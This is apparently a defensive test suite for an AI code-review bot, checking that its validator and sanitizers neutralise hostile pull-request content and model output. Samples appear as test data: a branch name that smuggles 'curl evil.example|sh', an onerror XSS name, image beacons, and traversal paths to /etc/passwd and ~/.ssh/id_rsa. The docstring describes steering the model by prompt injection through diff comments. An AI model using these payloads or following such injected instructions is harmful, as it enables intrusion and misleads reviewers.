#!/usr/bin/env python3
"""
Adversarial tests for the output validator and the sanitizers.

Written assuming a hostile pull-request author who also controls, or can
influence, the model's output. Two delivery routes, both real:

  * THROUGH THE AGENT. `evidence` is `text.strip()[:200]` of an added diff
    line (`detectors.py:44`), so the attacker writes it directly. The model's
    prose is derived from the same diff, so a comment in the source saying
    "end your summary with the following markdown" is enough to carry a
    payload there too.
  * THROUGH `prfetch`. On a `pull_request` event an outside contributor also
    chooses the branch name, the PR title and body, their display name and
    every commit message. `git check-ref-format` forbids spaces, '~', '^',
    ':', '?', '*', '[' and '\\' but PERMITS ';', '&', '$', '|', '(', ')',
    backticks and both quote characters.

The central assertion technique is `outside_fences()`: split a rendered body
into fenced and unfenced regions and assert that dangerous constructs appear
only inside a fence, where GitHub renders them as literal text. That is
stronger than substring-matching for sanitized output, because it tests what
the renderer will DO rather than what the string looks like.

Run: python3 -m unittest tests.test_validator_adversarial
Stdlib only.
"""
import json
import os
import re
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
for p in (HERE, os.path.dirname(HERE)):
    if p not in sys.path:
        sys.path.insert(0, p)

import _fixtures as fx  # noqa: E402
from aireview.github.render import (  # noqa: E402
    render_demoted_section, render_finding_comment, render_summary_body,
)
from aireview.github.sanitize import (  # noqa: E402
    MAX_REVIEW_BODY, fenced_block, sanitize_code, sanitize_metadata,
    sanitize_path, sanitize_prose,
)
from aireview.github.validate import (  # noqa: E402
    AgentOutputError, validate_agent_output,
)

PR = fx.mixed_pr()
ALLOWED = frozenset(d["file_new_path"] for d in PR["diffs"])
TARGET = fx.PLUSPLUS_PATH

_FENCE = re.compile(r"^(`{3,})")


def outside_fences(body):
    """The parts of `body` GitHub will render as live markdown."""
    out, fence = [], None
    for line in body.split("\n"):
        m = _FENCE.match(line.lstrip())
        if m:
            run = m.group(1)
            if fence is None:
                fence = run
                continue
            if len(run) >= len(fence):
                fence = None
                continue
        if fence is None:
            out.append(line)
    return "\n".join(out), fence is None


def agent_output(**over):
    finding = {
        "principle_id": "TS-009",
        "rulepack_id": "base",
        "severity": "medium",
        "surface": "typescript",
        "path": TARGET,
        "line": 42,
        "message": "`any` type usage is banned.",
        "evidence": "  const b = 2;",
    }
    finding.update(over.pop("finding", {}))
    payload = {"findings": [finding]}
    payload.update(over)
    return json.dumps(payload)


def validate(raw, **kw):
    kw.setdefault("prfetch", PR)
    kw.setdefault("allowed_paths", ALLOWED)
    kw.setdefault("blocking_enabled", False)
    return validate_agent_output(raw, **kw)


# --------------------------------------------------------------------------- #
# 1. The verdict is ours, not the model's
# --------------------------------------------------------------------------- #
class TestVerdictCannotBeInfluenced(unittest.TestCase):

    def test_model_supplied_approve_verdict_has_no_effect(self):
        """The headline case. There is no `approve` in the enum, and even a
        well-formed `request_changes` from the model is ignored - the verdict
        is a function of the surviving findings, full stop.
        """
        result = validate(agent_output(
            verdict="approve",
            finding={"severity": "critical",
                     "message": "SQL injection in the new policy."}))
        self.assertEqual(result["verdict"], "request_changes")
        self.assertNotIn("approve", result["verdict"])

    def test_model_cannot_downgrade_a_critical_finding(self):
        result = validate(agent_output(
            verdict="comment", risk={"band": "low"},
            finding={"severity": "critical", "message": "default-allow policy"}))
        self.assertEqual(result["verdict"], "request_changes")

    def test_model_cannot_upgrade_an_empty_review(self):
        result = validate(json.dumps({"findings": [],
                                      "verdict": "request_changes"}))
        self.assertEqual(result["verdict"], "comment")

    def test_a_finding_cannot_opt_out_of_the_verdict_by_claiming_advisory(self):
        """`advisory` is recomputed from `enforcement`. A model that marks an
        established critical rule advisory must not thereby mute it.
        """
        result = validate(agent_output(finding={
            "severity": "critical", "enforcement": "established",
            "advisory": True, "message": "hardcoded service-role key"}))
        self.assertFalse(result["findings"][0]["advisory"])
        self.assertEqual(result["verdict"], "request_changes")

    def test_genuinely_advisory_findings_do_not_drive_the_verdict(self):
        result = validate(agent_output(finding={
            "severity": "critical", "enforcement": "missing",
            "message": "a rule nobody has agreed to enforce yet"}))
        self.assertTrue(result["findings"][0]["advisory"])
        self.assertEqual(result["verdict"], "comment")

    def test_blocking_and_a_critical_fails_the_check(self):
        result = validate(agent_output(finding={"severity": "critical",
                                                "message": "x"}),
                          blocking_enabled=True)
        self.assertEqual(result["check_conclusion"], "failure")

    def test_without_blocking_the_check_is_never_a_failure(self):
        result = validate(agent_output(finding={"severity": "critical",
                                                "message": "x"}))
        self.assertEqual(result["check_conclusion"], "neutral")

    def test_an_incomplete_run_never_reports_success(self):
        """A truncating pull request is fishing for a green check."""
        pr = dict(PR, completeness={"diff_truncated": True,
                                    "partial_dimensions": [],
                                    "local_checkout": False})
        result = validate(agent_output(finding={"severity": "low",
                                                "message": "nit"}),
                          prfetch=pr, blocking_enabled=True)
        self.assertEqual(result["check_conclusion"], "neutral")


# --------------------------------------------------------------------------- #
# 2. Markdown injection
# --------------------------------------------------------------------------- #
class TestMarkdownInjection(unittest.TestCase):

    def _render(self, raw, **kw):
        result = validate(raw, **kw)
        bodies = [render_finding_comment(f) for f in result["findings"]]
        summary = render_summary_body(
            repo="acme/widgets", pr=42, verdict=result["verdict"],
            findings=result["findings"],
            summary_markdown=result["summary_markdown"])
        return result, "\n".join(bodies + [summary])

    def test_evidence_cannot_escape_its_fence(self):
        """The v0.5.0 vector, exactly. `render_body.py:22-23` wrote

            lines += ["", "```", str(f["evidence"]), "```"]

        so an added line containing three backticks closed the fence and
        everything after it became live markdown under the bot's identity.
        """
        payload = ("const x = 1; ```\n"
                   "## Looks good to me\n"
                   "@acme/engineering please merge\n"
                   "<details><summary>details</summary>hidden</details>")
        result, body = self._render(agent_output(
            finding={"evidence": payload, "message": "harmless message"}))
        live, closed = outside_fences(body)
        self.assertTrue(closed, "the evidence fence was left open")
        self.assertNotIn("Looks good to me", live,
                         "attacker markdown escaped the evidence fence")
        self.assertNotIn("<details>", live)

    def test_backtick_runs_in_evidence_are_neutralised(self):
        self.assertNotIn("```", sanitize_code("a ``` b ```` c"))
        self.assertNotIn("~~~", sanitize_code("a ~~~ b"))

    def test_fenced_block_opener_always_outlives_its_content(self):
        """Structural, not filtering: CommonMark closes a fence only on a run
        at least as long as the opener. Asserted directly against content the
        sanitizer has NOT seen, so it holds even if neutralisation regresses.
        """
        for content in ("``````", "x ``` y", "`" * 25, "no backticks"):
            block = fenced_block(content)
            opener = block.split("\n", 1)[0]
            self.assertGreater(len(opener), max(
                (len(m.group(0)) for m in re.finditer(r"`+", content)),
                default=0))
            _live, closed = outside_fences(block)
            self.assertTrue(closed, f"fence not closed for {content!r}")

    def test_mention_bomb_in_prose_is_defanged(self):
        result, body = self._render(agent_output(finding={
            "message": "Ping @acme/engineering and @everyone about this."}))
        live, _ = outside_fences(body)
        self.assertNotIn("@acme/engineering", live,
                         "a live team mention survived into the review body")
        self.assertNotIn("@everyone", live)
        self.assertIn("acme/engineering", live,
                      "defanging deleted the text instead of neutralising it")

    def test_mention_in_evidence_stays_inside_the_fence(self):
        """Evidence is NOT defanged, deliberately: inside a fence GitHub does
        not linkify, and inserting a zero-width character would travel with
        any code the reader copies. The guarantee is containment.
        """
        result, body = self._render(agent_output(finding={
            "evidence": "import x from '@acme/engineering';"}))
        live, closed = outside_fences(body)
        self.assertTrue(closed)
        self.assertNotIn("@acme/engineering", live)
        self.assertIn("@acme/engineering", body)

    def test_html_in_prose_is_inert_and_still_visible(self):
        """Escaped rather than stripped. A deleted `<details>` is invisible to
        a reviewer auditing what the bot said; an escaped one is inert and
        reads back exactly as written.
        """
        result, body = self._render(agent_output(finding={
            "message": "<details><summary>Click</summary>"
                       "<img src='http://attacker.example/beacon.png'>"
                       "</details>"}))
        live, _ = outside_fences(body)
        self.assertNotIn("<details>", live)
        self.assertNotIn("<img", live)
        self.assertIn("&lt;details&gt;", live)

    def test_html_comment_in_prose_cannot_hide_content(self):
        """`<!--` with no closing `-->` swallows everything after it,
        including the real findings rendered below.

        Asserted against the attacker's specific text rather than against
        '<!--' generally: we emit one HTML comment of our own, the
        `<!-- aireview:key=... -->` reconciliation marker, and it is ours.
        """
        result, body = self._render(agent_output(finding={
            "message": "benign<!-- everything after this disappears"}))
        live, _ = outside_fences(body)
        self.assertNotIn("<!-- everything after this disappears", live)
        self.assertIn("&lt;!-- everything after this disappears", live)

    def test_html_comment_in_evidence_stays_inside_the_fence(self):
        result, body = self._render(agent_output(finding={
            "evidence": "<!-- TODO: remove this hack -->"}))
        live, closed = outside_fences(body)
        self.assertTrue(closed)
        self.assertNotIn("<!-- TODO", live,
                         "an HTML comment reached the live part of the body")
        self.assertIn("<!-- TODO: remove this hack -->", body,
                      "legitimate comment-shaped source was destroyed")

    def test_sanitizing_twice_is_the_same_as_sanitizing_once(self):
        """The validator sanitizes, then the renderer sanitizes again as
        defence in depth. A non-idempotent escape turns `&lt;details&gt;`
        into `&amp;lt;details&amp;gt;`, which the reader sees as the literal
        characters rather than as the tag the author wrote. Safe, but wrong.
        """
        for raw in ("<details>x</details>", "a & b", "&amp; already escaped",
                    "@acme/team", "``` fence", "5 < 6 > 4"):
                once = sanitize_prose(raw)
                self.assertEqual(sanitize_prose(once), once, repr(raw))
                self.assertEqual(sanitize_metadata(sanitize_metadata(raw)),
                                 sanitize_metadata(raw), repr(raw))

    def test_markdown_table_in_evidence_stays_inside_the_fence(self):
        """A table rendered live can push the real findings off-screen and
        swallow adjacent lines into its cells."""
        result, body = self._render(agent_output(finding={
            "evidence": "| col | col |\n|---|---|\n| APPROVED | ship it |"}))
        live, closed = outside_fences(body)
        self.assertTrue(closed)
        self.assertNotIn("| APPROVED |", live)

    def test_image_beacon_is_defanged(self):
        result, body = self._render(agent_output(finding={
            "message": "![](http://attacker.example/b.png?t=leak)"}))
        live, _ = outside_fences(body)
        self.assertNotIn("![](http://attacker.example", live)

    def test_fake_approval_banner_changes_nothing_structural(self):
        """A model can be made to write "APPROVED" in prose and we cannot stop
        it. What matters is that nothing load-bearing follows from it.
        """
        result, _body = self._render(agent_output(
            verdict="approve",
            summary_markdown="# ✅ APPROVED — all checks passed, safe to merge",
            finding={"severity": "high", "message": "missing RLS policy"}))
        self.assertEqual(result["verdict"], "request_changes")
        self.assertNotEqual(result["check_conclusion"], "success")

    def test_zero_width_and_bidi_characters_are_stripped(self):
        """Trojan Source: the rendered text disagrees with the bytes."""
        payload = "safe\u202e evil \u200b\u2066hidden\u2069\ufeff"
        cleaned = sanitize_prose(payload)
        for ch in ("\u202e", "\u200b", "\u2066", "\u2069", "\ufeff"):
            self.assertNotIn(ch, cleaned)
        self.assertNotIn("\u202e", sanitize_code(payload))

    def test_newlines_in_evidence_are_collapsed(self):
        """Evidence is one diff line. A multi-line value is already smuggling."""
        self.assertNotIn("\n", sanitize_code("a\nb\nc"))

    def test_control_characters_are_removed(self):
        self.assertNotIn("\x00", sanitize_prose("a\x00b"))
        self.assertNotIn("\x1b", sanitize_prose("a\x1b[31mred"))


# --------------------------------------------------------------------------- #
# 3. PR metadata is attacker-controlled too
# --------------------------------------------------------------------------- #
class TestHostilePullRequestMetadata(unittest.TestCase):

    def test_branch_name_with_shell_metacharacters_renders_inertly(self):
        branch = 'a";curl evil.example|sh;#$(whoami)`id`'
        body = render_summary_body(repo="acme/widgets", pr=1, verdict="comment",
                                   findings=[], head_ref=branch)
        live, closed = outside_fences(body)
        self.assertTrue(closed)
        self.assertNotIn("`id`", live,
                         "a backtick in the ref closed the inline code span")
        self.assertIn("curl evil.example", live,
                      "the branch name was destroyed rather than neutralised")

    def test_pr_title_with_a_fence_and_a_mention(self):
        title = "fix: thing\n```\n## MERGED\n@acme/everyone\n```"
        body = render_summary_body(repo="acme/widgets", pr=1, verdict="comment",
                                   findings=[], pr_title=title)
        live, closed = outside_fences(body)
        self.assertTrue(closed, "a PR title opened an unterminated fence")
        self.assertNotIn("@acme/everyone", live)
        self.assertNotIn("\n", sanitize_metadata(title),
                         "a newline in the title escaped its inline context")

    def test_author_display_name_with_html(self):
        name = "<img src=x onerror=alert(1)> Totally Normal"
        cleaned = sanitize_metadata(name)
        self.assertNotIn("<img", cleaned)
        self.assertIn("&lt;img", cleaned)

    def test_a_file_path_with_a_backtick_cannot_break_its_code_span(self):
        """Membership in `allowed_paths` says the file is real. It says
        nothing about whether the name is safe to interpolate.
        """
        path = "src/weird`name`.ts"
        rendered = render_demoted_section(
            [{"principle_id": "TS-009", "severity": "low", "path": path,
              "line": 3, "message": "nit"}],
            heading="Demoted")
        self.assertNotIn("`name`", rendered)
        self.assertEqual(rendered.count("`") % 2, 0,
                         "unbalanced backticks: the code span leaks")

    def test_a_path_is_not_given_an_invisible_character(self):
        """No defanging in a code span - a path somebody copies must be the
        path, byte for byte apart from the characters we had to neutralise.
        """
        self.assertNotIn("\u200b", sanitize_path("src/@scope/pkg/index.ts"))
        self.assertIn("@scope", sanitize_path("src/@scope/pkg/index.ts"))


# --------------------------------------------------------------------------- #
# 4. Paths
# --------------------------------------------------------------------------- #
class TestPathValidation(unittest.TestCase):

    def _reject_reason(self, path):
        result = validate(agent_output(finding={"path": path, "line": None}))
        self.assertEqual(result["findings"], [],
                         f"accepted hostile path {path!r}")
        return result["rejected"][0]["reason"]

    def test_traversal_is_rejected(self):
        self.assertEqual(self._reject_reason("../../../etc/passwd"),
                         "path_traversal")
        self.assertEqual(self._reject_reason("src/../../secrets.env"),
                         "path_traversal")

    def test_absolute_paths_are_rejected(self):
        self.assertEqual(self._reject_reason("/etc/passwd"), "absolute_path")
        self.assertEqual(self._reject_reason("C:\\Windows\\win.ini"),
                         "absolute_path")

    def test_home_relative_paths_are_rejected(self):
        self.assertEqual(self._reject_reason("~/.ssh/id_rsa"),
                         "home_relative_path")

    def test_a_path_not_in_the_pr_is_rejected(self):
        self.assertEqual(self._reject_reason("src/never/touched.ts"),
                         "path_not_in_pr")

    def test_near_miss_paths_are_rejected_byte_equality_not_similarity(self):
        for near in (TARGET + " ", " " + TARGET, TARGET.upper(),
                     TARGET.replace("/", "//")):
            result = validate(agent_output(finding={"path": near, "line": None}))
            self.assertEqual(result["findings"], [],
                             f"accepted near-miss path {near!r}")

    def test_nul_byte_is_rejected(self):
        self.assertEqual(self._reject_reason("src/a.ts\x00.png"),
                         "path_contains_nul")

    def test_lexical_checks_hold_even_if_allowed_paths_is_poisoned(self):
        """Defence in depth. If something upstream admits '../../etc/passwd'
        into the PR files list, membership alone would wave it through.
        """
        result = validate(
            agent_output(finding={"path": "../../etc/passwd", "line": None}),
            allowed_paths=frozenset({"../../etc/passwd"}))
        self.assertEqual(result["findings"], [])
        self.assertEqual(result["rejected"][0]["reason"], "path_traversal")

    def test_symlinked_paths_are_rejected_when_a_checkout_is_available(self):
        with tempfile.TemporaryDirectory() as root:
            os.makedirs(os.path.join(root, "docs"))
            os.symlink("/etc/passwd", os.path.join(root, "docs", "notes.md"))
            result = validate(
                agent_output(finding={"path": "docs/notes.md", "line": None}),
                allowed_paths=frozenset({"docs/notes.md"}),
                checkout_root=root)
            self.assertEqual(result["findings"], [])
            self.assertEqual(result["rejected"][0]["reason"], "path_is_symlink")

    def test_a_symlinked_parent_directory_is_also_rejected(self):
        with tempfile.TemporaryDirectory() as root:
            outside = os.path.join(root, "outside")
            os.makedirs(os.path.join(outside, "x"))
            os.symlink(outside, os.path.join(root, "docs"))
            open(os.path.join(outside, "x", "f.md"), "w").close()
            result = validate(
                agent_output(finding={"path": "docs/x/f.md", "line": None}),
                allowed_paths=frozenset({"docs/x/f.md"}),
                checkout_root=root)
            self.assertEqual(result["rejected"][0]["reason"], "path_is_symlink")

    def test_without_a_checkout_only_the_lexical_checks_apply(self):
        """Stated as a test so the degradation is visible rather than assumed.
        A reader of this suite should not come away believing symlinks are
        always checked.
        """
        with tempfile.TemporaryDirectory() as root:
            os.makedirs(os.path.join(root, "docs"))
            os.symlink("/etc/passwd", os.path.join(root, "docs", "notes.md"))
            result = validate(
                agent_output(finding={"path": "docs/notes.md", "line": None}),
                allowed_paths=frozenset({"docs/notes.md"}),
                checkout_root=None)
            self.assertEqual(len(result["findings"]), 1)


# --------------------------------------------------------------------------- #
# 5. Lines: demotion, never silent loss
# --------------------------------------------------------------------------- #
class TestLineValidation(unittest.TestCase):

    def test_an_uncommentable_line_demotes_rather_than_drops(self):
        result = validate(agent_output(finding={"line": 99999,
                                                "message": "still real"}))
        self.assertEqual(len(result["findings"]), 1)
        self.assertFalse(result["findings"][0]["positionable"])
        self.assertEqual(result["rejected"], [])

    def test_a_commentable_line_is_positionable(self):
        result = validate(agent_output(finding={"line": 45}))
        self.assertTrue(result["findings"][0]["positionable"],
                        "line 45 is the last line of the hunk - the one the "
                        "v0.5.0 walker lost")

    def test_model_cannot_assert_positionable_itself(self):
        result = validate(agent_output(finding={"line": 99999,
                                                "positionable": True}))
        self.assertFalse(result["findings"][0]["positionable"])

    def test_a_line_without_a_path_is_not_positionable(self):
        result = validate(agent_output(finding={"path": None, "line": 42}))
        self.assertFalse(result["findings"][0]["positionable"])
        self.assertIsNone(result["findings"][0]["line"])

    def test_non_integer_lines_do_not_crash_or_position(self):
        for bad in (True, [], {}, "not a number", 3.7, None):
            result = validate(agent_output(finding={"line": bad}))
            self.assertEqual(len(result["findings"]), 1, repr(bad))
            self.assertFalse(result["findings"][0]["positionable"], repr(bad))


# --------------------------------------------------------------------------- #
# 6. Structural and shape failures
# --------------------------------------------------------------------------- #
class TestMalformedOutput(unittest.TestCase):

    def test_malformed_json_is_a_run_failure_not_an_empty_review(self):
        """Silently treating a parse failure as "no findings" posts a clean
        review for a run that never happened.
        """
        for bad in ("", "not json", "{", '{"findings": [}',
                    '```json\n{"findings": []}\n```'):
            with self.assertRaises(AgentOutputError, msg=repr(bad)):
                validate(bad)

    def test_a_json_array_at_the_top_level_is_rejected(self):
        with self.assertRaises(AgentOutputError):
            validate("[]")

    def test_missing_findings_array_is_rejected(self):
        with self.assertRaises(AgentOutputError):
            validate('{"verdict": "approve"}')

    def test_an_empty_findings_array_is_a_valid_clean_review(self):
        result = validate('{"findings": []}')
        self.assertEqual(result["findings"], [])
        self.assertEqual(result["verdict"], "comment")

    def test_an_invented_severity_is_rejected_not_coerced(self):
        result = validate(agent_output(finding={"severity": "blocker"}))
        self.assertEqual(result["findings"], [])
        self.assertIn("invalid_severity", result["rejected"][0]["reason"])

    def test_an_unknown_rulepack_is_rejected_when_the_set_is_known(self):
        result = validate(agent_output(finding={"rulepack_id": "fabricated"}),
                          allowed_rulepack_ids=frozenset({"base"}))
        self.assertEqual(result["findings"], [])
        self.assertIn("unknown_rulepack_id", result["rejected"][0]["reason"])

    def test_a_missing_rulepack_id_is_filled_not_rejected(self):
        raw = json.loads(agent_output())
        del raw["findings"][0]["rulepack_id"]
        result = validate(json.dumps(raw), default_rulepack_id="unknown")
        self.assertEqual(result["findings"][0]["rulepack_id"], "unknown")

    def test_findings_that_are_not_objects_are_rejected_individually(self):
        raw = json.dumps({"findings": ["a string", 42, None,
                                       json.loads(agent_output())["findings"][0]]})
        result = validate(raw)
        self.assertEqual(len(result["findings"]), 1)
        self.assertEqual(len(result["rejected"]), 3)

    def test_a_finding_with_no_text_at_all_is_rejected(self):
        result = validate(agent_output(finding={"message": "", "headline": ""}))
        self.assertEqual(result["findings"], [])
        self.assertEqual(result["rejected"][0]["reason"], "no_message_or_headline")

    def test_the_dedup_key_is_never_taken_from_the_model(self):
        """A model-chosen key could collide with another finding's key and
        suppress it on the next run.
        """
        result = validate(agent_output(finding={"dedup_key": "attacker-chosen"}))
        self.assertNotEqual(result["findings"][0]["dedup_key"],
                            "attacker-chosen")

    def test_a_flood_of_findings_is_capped_and_audited(self):
        one = json.loads(agent_output())["findings"][0]
        result = validate(json.dumps({"findings": [dict(one) for _ in range(900)]}))
        self.assertLessEqual(len(result["findings"]), 500)
        self.assertTrue(any("too_many_findings" in r["reason"]
                            for r in result["rejected"]))


# --------------------------------------------------------------------------- #
# 7. Size
# --------------------------------------------------------------------------- #
class TestSizeLimits(unittest.TestCase):

    def test_a_huge_review_is_trimmed_under_the_github_limit(self):
        """Over-length is not a cosmetic problem: GitHub answers 422, and a
        422 on the reviews endpoint destroys the entire review.
        """
        one = json.loads(agent_output())["findings"][0]
        findings = []
        for i in range(300):
            f = dict(one)
            f["message"] = f"finding {i} " + ("x" * 500)
            f["evidence"] = "y" * 400
            findings.append(f)
        result = validate(json.dumps({"findings": findings,
                                      "summary_markdown": "z" * 30_000}))
        total = len(result["summary_markdown"]) + sum(
            len(f.get("message") or "") + len(f.get("evidence") or "")
            for f in result["findings"])
        self.assertLess(total, MAX_REVIEW_BODY)

    def test_the_lowest_severity_evidence_is_sacrificed_first(self):
        """A modest overflow, so the ORDER of sacrifice is observable.

        With a large enough overflow everything is trimmed and the ordering
        proves nothing; the interesting case is the one where only some of it
        has to go.
        """
        one = json.loads(agent_output())["findings"][0]
        critical = dict(one, severity="critical", message="c" * 300,
                        evidence="KEEP-ME")
        low = dict(one, severity="low", message="l" * 300, evidence="DROP-ME")
        result = validate(json.dumps({"findings": [low, critical] * 10}),
                          max_body_chars=9_300)
        lows = [f for f in result["findings"] if f["severity"] == "low"]
        criticals = [f for f in result["findings"] if f["severity"] == "critical"]
        self.assertTrue(any(f["evidence"] is None for f in lows),
                        "nothing was trimmed, so the test proves nothing")
        self.assertTrue(all(f["evidence"] == "KEEP-ME" for f in criticals),
                        "critical evidence was dropped while low-severity "
                        "evidence survived")

    def test_an_unfixable_overflow_still_cannot_reach_github(self):
        """The validator's budget is best-effort shaping; `truncate_body` is
        the hard guard. Enough findings and no amount of trimming fits, so
        the final body - not the budget - has to be what enforces the limit.
        """
        from aireview.github.sanitize import truncate_body
        body = "x" * (MAX_REVIEW_BODY * 3)
        self.assertLessEqual(len(truncate_body(body)), MAX_REVIEW_BODY)

    def test_a_single_enormous_field_is_capped(self):
        result = validate(agent_output(finding={"message": "m" * 100_000,
                                                "evidence": "e" * 100_000}))
        self.assertLess(len(result["findings"][0]["message"]), 2_100)
        self.assertLess(len(result["findings"][0]["evidence"]), 500)


if __name__ == "__main__":
    unittest.main(verbosity=2)
